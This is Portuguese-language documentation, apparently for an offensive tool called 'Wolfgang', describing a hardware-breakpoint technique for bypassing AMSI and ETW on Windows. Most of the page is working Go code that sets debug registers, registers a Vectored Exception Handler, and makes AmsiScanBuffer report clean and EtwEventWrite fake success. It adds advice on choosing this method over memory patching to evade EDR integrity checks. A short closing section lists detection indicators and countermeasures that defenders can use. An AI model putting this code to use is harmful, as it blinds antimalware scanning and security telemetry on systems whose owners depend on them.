    Hardware Breakpoint Bypass¶

    O que é¶

    Hardware breakpoints (HWBP) são uma feature da CPU x86/x64 que permite pausar a execução quando o instruction pointer atinge um endereço específico. O Wolfgang usa essa capacidade para interceptar funções de segurança (AMSI, ETW) sem modificar nenhum byte em memória -- o processador gera uma exception quando a função é chamada, e um Vectored Exception Handler (VEH) altera o retorno da função antes que ela execute.

    Isso é significativamente mais furtivo que memory patching porque integrity checks que comparam bytes em memória com a versão em disco não detectam nenhuma alteração.

    Por que funciona¶

    Debug Registers¶

    CPUs x86/x64 possuem 4 debug registers de endereço (DR0-DR3) e um de controle (DR7). Cada register pode monitorar um endereço de memória e gerar uma EXCEPTION_SINGLE_STEP (0x80000004) quando o instruction pointer o atinge.

    DR0: endereço do breakpoint 0
DR1: endereço do breakpoint 1
DR2: endereço do breakpoint 2
DR3: endereço do breakpoint 3
DR6: status (qual DR disparou)
DR7: controle (quais DRs estão ativos, tipo de breakpoint)

    O DR7 controla quais debug registers estão habilitados:

    func enableDR7(dr7 uint64, register int) uint64 {
    bit := uint(register * 2)
    return dr7 | (1 << bit)  // Liga o bit de local enable
}

func disableDR7(dr7 uint64, register int) uint64 {
    bit := uint(register * 2)
    return dr7 &^ (1 << bit) // Desliga o bit
}

    Bits 0-1 controlam DR0, bits 2-3 controlam DR1, etc. Apenas os bits de posição par (0, 2, 4, 6) habilitam local breakpoints (thread-local).

    Vectored Exception Handling (VEH)¶

    O Windows permite registrar handlers que recebem exceções antes do tratamento normal (SEH). Quando o processador gera EXCEPTION_SINGLE_STEP ao atingir um endereço monitorado, o VEH intercepta a exceção e pode:

    1. Inspecionar e modificar registros (RAX, RIP, RSP)
    2. Alterar o return value da função (setando RAX)
    3. Pular a função inteira (setando RIP para o return address)
    4. Retornar EXCEPTION_CONTINUE_EXECUTION para continuar normalmente

    Implementação no Wolfgang¶

    Manager¶

    O hwbp.Manager gerencia os 4 debug registers e o VEH:

    type Manager struct {
    mu         sync.Mutex
    handlersMu sync.RWMutex
    handlers   map[uintptr]HookHandler // endereço -> handler
    vehHandle  uintptr                 // handle do VEH
    usedRegs   [4]bool                 // quais DRs estão em uso
}

func NewManager() (*Manager, error) {
    m := &Manager{handlers: make(map[uintptr]HookHandler)}

    // Registra VEH como primeiro handler (prioridade 1)
    handle, _, _ := procAddVEH.Call(1, windows.NewCallback(vehCallback))
    m.vehHandle = handle
    globalManager = m
    return m, nil
}

    VEH Callback¶

    func vehCallback(info *exceptionPointers) uintptr {
    // Só trata EXCEPTION_SINGLE_STEP (debug breakpoint)
    if info.ExceptionRecord.ExceptionCode != exceptionSingleStep {
        return exceptionContinueSearch
    }

    // Busca handler registrado para este endereço
    handler, ok := m.handlers[info.ExceptionRecord.ExceptionAddress]
    if !ok {
        return exceptionContinueSearch
    }

    // Executa o handler (modifica contexto)
    ei := &ExceptionInfo{context: info.ContextRecord}
    handler(ei)

    // Limpa DR6 (status flags) e continua execução
    info.ContextRecord.setDr6(0)
    return exceptionContinueExec
}

    Instalação de Breakpoint¶

    func (m *Manager) SetBreakpoint(addr uintptr, handler HookHandler) (int, error) {
    // 1. Encontra um DR livre (0-3)
    reg := -1
    for i := 0; i < 4; i++ {
        if !m.usedRegs[i] { reg = i; break }
    }
    if reg == -1 {
        return 0, fmt.Errorf("all 4 hardware breakpoint registers in use")
    }

    // 2. Lock na OS thread (debug registers são per-thread)
    runtime.LockOSThread()

    // 3. Lê o contexto da thread
    threadHandle, _, _ := procGetCurrentThread.Call()
    var ctx CONTEXT64
    ctx.setFlags(contextFull | contextDebugRegisters)
    procGetThreadContext.Call(threadHandle, uintptr(unsafe.Pointer(&ctx)))

    // 4. Configura o DR com o endereço alvo
    ctx.setDR(reg, uint64(addr))

    // 5. Habilita o DR no DR7
    dr7 := enableDR7(ctx.dr7(), reg)
    ctx.setDr7(dr7)

    // 6. Aplica o contexto
    procSetThreadContext.Call(threadHandle, uintptr(unsafe.Pointer(&ctx)))

    // 7. Registra o handler
    m.handlers[addr] = handler
    m.usedRegs[reg] = true
    return reg, nil
}

    ExceptionInfo e Skip de Função¶

    O ExceptionInfo permite ao handler manipular registros e pular a função:

    type ExceptionInfo struct {
    context *CONTEXT64
}

func (e *ExceptionInfo) Rax() uint64     { return e.context.rax() }
func (e *ExceptionInfo) SetRax(v uint64) { e.context.setRax(v) }
func (e *ExceptionInfo) Rip() uint64     { return e.context.rip() }
func (e *ExceptionInfo) SetRip(v uint64) { e.context.setRip(v) }

func (e *ExceptionInfo) ReturnAddress() uint64 {
    return *(*uint64)(unsafe.Pointer(uintptr(e.context.rsp())))
}

func (e *ExceptionInfo) SkipFunction() {
    e.SetRip(e.ReturnAddress()) // RIP aponta para o caller
    e.SetRsp(e.Rsp() + 8)      // "pop" do return address da stack
}

    Handlers para AMSI e ETW¶

    func AMSIHandler(ei *ExceptionInfo) {
    ei.SetRax(0x80070057) // E_INVALIDARG: faz AMSI tratar como clean
    ei.SkipFunction()
}

func ETWHandler(ei *ExceptionInfo) {
    ei.SetRax(0) // STATUS_SUCCESS: caller acredita que evento foi emitido
    ei.SkipFunction()
}

    Instalação via helpers¶

    func InstallAMSIBypass(m *Manager) (int, error) {
    addr, _ := ResolveFunction("amsi.dll", "AmsiScanBuffer")
    return m.SetBreakpoint(addr, AMSIHandler)
}

func InstallETWBypass(m *Manager) (int, error) {
    addr, _ := ResolveFunction("ntdll.dll", "EtwEventWrite")
    return m.SetBreakpoint(addr, ETWHandler)
}

    Comparação: HWBP vs Memory Patching¶

    Aspecto HWBP Memory Patching
    Modifica memória Nao Sim (bytes da funcao)
    Integrity check evasion Sim Nao
    Limite de hooks 4 (DR0-DR3) Ilimitado
    Escopo Per-thread Per-process
    VirtualProtect necessário Nao Sim
    Detectável via GetThreadContext Sim Nao
    Performance Overhead de exception handling Nenhum overhead
    Complexidade Alta (VEH + context manipulation) Baixa (write bytes)

    Quando usar cada um¶

    • HWBP (preferível): Quando integrity checks são preocupação, ou quando o EDR monitora VirtualProtect em DLLs de segurança
    • Patching (fallback): Quando mais de 4 funções precisam de bypass, ou quando o EDR monitora debug registers via GetThreadContext

    Detecção¶

    IOC Descrição
    GetThreadContext / SetThreadContext Manipulação de debug registers
    AddVectoredExceptionHandler Registro de VEH (evento raro em apps normais)
    DR0-DR3 apontando para funções de segurança Inspeção de debug registers
    EXCEPTION_SINGLE_STEP frequentes Alta taxa de debug exceptions

    Contramedidas¶

    • Periodic DR inspection: EDR chama GetThreadContext para verificar se debug registers apontam para funções sensíveis
    • VEH monitoring: Hooks em AddVectoredExceptionHandler para detectar registro de handlers
    • NtSetInformationThread: ThreadHideFromDebugger pode desabilitar debug exceptions para a thread
